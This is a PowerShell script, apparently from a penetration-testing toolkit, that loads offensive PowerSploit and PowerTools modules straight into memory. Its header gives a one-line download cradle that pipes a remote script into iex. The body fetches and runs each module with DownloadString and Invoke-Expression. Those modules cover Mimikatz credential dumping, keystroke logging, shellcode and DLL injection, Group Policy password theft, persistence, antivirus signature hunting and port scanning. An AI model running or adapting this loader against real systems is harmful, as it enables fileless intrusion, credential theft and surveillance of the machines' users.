<#
=========================================================================================================================================
Most Useful PowerSploit and PowerTools Modules that can be loaded into memory from LOCAL repository

To use this script stand up a websever either with the windows mongoose webserver or if on Linux use the python SimpleHTTPServer module
have it serve the contents of the zip file you just extracted, then inside a PowerShell console, use
(New-Object System.Net.WebClient).DownloadString('http://192.168.0.182:8080/local-in-memory-downloader.ps1')|iex,
where the ip is the ip of your local webserver and port is the port its serving content on, this will do the magic.
=========================================================================================================================================
#>
$localipfull = Get-WmiObject -query "select * from Win32_NetworkAdapterConfiguration where IPEnabled = $true" |
  Select-Object -Expand IPAddress | 
  Where-Object { ([Net.IPAddress]$_).AddressFamily -eq 'InterNetwork' }
$localip = $localipfull.trim()
$port = ':8080'#set this variable to the port of your local webserver
$http = 'http://'#set this variable to https:// if required
$downloadcradle = New-Object Net.WebClient
$modules = @(
'/PowerSploit/CodeExecution/Invoke--Shellcode.ps1','/PowerSploit/CodeExecution/Invoke-DllInjection.ps1','/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1','/PowerSploit/Exfiltration/Invoke-NinjaCopy.ps1','/PowerSploit/Exfiltration/Get-GPPPassword.ps1','/PowerSploit/Exfiltration/Get-Keystrokes.ps1','/PowerSploit/Exfiltration/Get-TimedScreenshot.ps1','/PowerSploit/CodeExecution/Invoke-ReflectivePEInjection.ps1','/PowerTools/PowerUp/PowerUp.ps1','/PowerTools/PowerView/powerview.ps1','/PowerTools/PewPewPew/Invoke-MassCommand.ps1','/PowerTools/PewPewPew/Invoke-MassMimikatz.ps1','/PowerTools/PewPewPew/Invoke-MassSearch.ps1','/PowerTools/PewPewPew/Invoke-MassTemplate.ps1','/PowerTools/PewPewPew/Invoke-MassTokens.ps1','/PowerSploit/Persistence/Persistence.psm1','/PowerSploit/AntivirusBypass/Find-AVSignature.ps1','/PowerSploit/CodeExecution/Invoke-ShellcodeMSIL.ps1','/PowerSploit/Recon/Invoke-Portscan.ps1')
#Build the download command line iterate through modules and import
ForEach ($module in $modules) {
$url = $http+$localip+$port+$module
$command = $($downloadcradle).DownloadString($($url))
Invoke-Expression $command
}
Write-Host
Write-Host 'The following modules were imported into this PowerShell session;'
Write-Host
Write-Host '########################################################################################################'
Write-Output $modules
Write-Host '########################################################################################################'
Write-Host
Write-Host 'For detailed help on each use 'Get-Help ModuleName' ie "Get-Help Invoke-AllChecks -Full", as sample shown below.'
Write-Host
Get-Help Invoke-AllChecks -Full
